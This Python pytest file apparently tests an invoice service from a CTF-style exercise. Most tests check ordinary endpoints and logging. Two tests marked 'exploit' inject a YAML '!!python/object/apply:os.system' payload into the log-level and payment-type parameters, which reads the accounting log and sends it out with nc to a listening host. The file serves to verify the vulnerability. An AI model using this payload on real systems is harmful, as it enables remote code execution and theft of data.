from subprocess import PIPE, TimeoutExpired
import subprocess
import pytest
import requests
import logging
import json
import secrets
import docker
import os

logger = logging.getLogger()
URL = f"http://{os.environ['INVOICE_SERVICE_HOST']}:7354"


def test_invoice_overview():
    params = {'name': 'do-not-exist'}
    r = requests.get(URL, params)
    assert r.status_code == 200
    assert len(r.json()['invoices']) == 0


def test_invoice_overview_error_handling():
    r = requests.get(URL)
    assert r.status_code == 400


def test_add_invoice():
    params = {'name': 'somebody', 'item': 'pizza'}
    n = len(find_accounted_invoices(guest_name=params['name'], item=params['item']))

    r = requests.post(URL + '/add', data=params)
    invoice_number = r.json()['invoice_number']
    assert r.status_code == 200
    assert len(find_accounted_invoices(guest_name=params['name'], item=params['item'])) == n + 1
    storno_invoice(invoice_number, 'somebody')


def test_add_invoice_error_handling():
    r = requests.post(URL + '/add')
    assert r.status_code == 400

# storno now does not return error if invoice number does not exist

# def test_storno_invoice_error_handling():
#     params = {'number': 'non-exisitng'}
#     r = requests.post(URL + '/storno', params)
#     assert r.status_code == 404


def test_request_bill():
    guest_name = secrets.token_hex(8)
    add_invoice_to_accounting_log(guest_name, 'pizza')
    add_invoice_to_accounting_log(guest_name, 'wine')

    params = {'name': guest_name}
    r = requests.get(URL + '/request-bill', params)

    assert r.status_code == 200
    assert float(r.json()['total']) == 10.0


def test_request_bill_error_handling():
    r = requests.get(URL + '/request-bill')
    assert r.status_code == 400


@pytest.mark.no_pipeline_support
def test_setting_log_level():
    client = docker.from_env()
    container = client.containers.get('ringring-invoices')
    old_logs = len(container.logs().decode().splitlines())

    params = {'log-level': 'INFO', 'name': 'whoever'}
    r = requests.get(URL, params)

    latest_logs = container.logs().decode().splitlines()[old_logs:]
    invoice_logs = ''.join([line for line in latest_logs if 'invoice_controller' in line])
    assert r.status_code == 200
    assert 'INFO' in invoice_logs
    assert 'DEBUG' not in invoice_logs


@pytest.mark.no_pipeline_support
def test_invoice_log_accounting():
    client = docker.from_env()
    container = client.containers.get('ringring-invoices')
    old_logs = container.logs().decode()

    add_invoice_to_accounting_log('someone', 'pizza')

    latest_logs = container.logs().decode().replace(old_logs, '')
    assert 'ACCOUNT' in latest_logs


@pytest.mark.no_pipeline_support
@pytest.mark.exploit
def test_exploit_invoice_overview():
    add_invoice_to_accounting_log('someone', 'SECRET_ENO_TOKEN')

    proc = subprocess.Popen(['nc', '-l', '-p', '7777'], stdout=PIPE)

    params = {'name': 'whoever',
              'log-level': f"!!python/object/apply:os.system [cat /InvoiceApp/accounting/outstanding-invoices.log | nc -q 5 {os.environ['TESTING_HOST']} 7777]"}
    requests.get(url=URL, params=params)

    try:
        stdout, _ = proc.communicate(timeout=3)
    except TimeoutExpired:
        proc.kill()
        stdout, err = proc.communicate()
        logger.warning(
            f'Waiting and listening to :7777 for exploit information ran into timeout. stdout: {stdout}, err: {err}')

    assert b'SECRET_ENO_TOKEN' in stdout


@pytest.mark.no_pipeline_support
@pytest.mark.exploit
def test_exploit_add_invoice():
    add_invoice_to_accounting_log('someone', 'SECRET_ENO_TOKEN')

    proc = subprocess.Popen(['nc', '-l', '-p', '7777'], stdout=PIPE)

    params = {'name': 'somebody', 'item': 'pizza',
              'payment-type': f"!!python/object/apply:os.system [cat /InvoiceApp/accounting/outstanding-invoices.log | nc -q 5 {os.environ['TESTING_HOST']} 7777]"}
    requests.post(URL + '/add', params)

    try:
        stdout, _ = proc.communicate(timeout=3)
    except TimeoutExpired:
        proc.kill()
        stdout, err = proc.communicate()
        logger.warning(
            f'Waiting and listening to :7777 for exploit information ran into timeout. stdout: {stdout}, err: {err}')

    assert b'SECRET_ENO_TOKEN' in stdout


def add_invoice_to_accounting_log(guest_name, item):
    params = {'name': guest_name, 'item': item}
    requests.post(URL + '/add', params)


def find_accounted_invoices(guest_name, item=None):
    params = {'name': guest_name}
    r = requests.get(URL + '/', params=params)
    if not item:
        return json.loads(r.text)['invoices']

    invoices = []
    for invoice in json.loads(r.text)['invoices']:
        if invoice['item'] == item:
            invoices.append(invoice)
    return invoices


def storno_invoice(invoice_number, guest_name):
    params = {'number': invoice_number}
    r = requests.post(URL + '/storno', params)
    assert r.status_code == 200
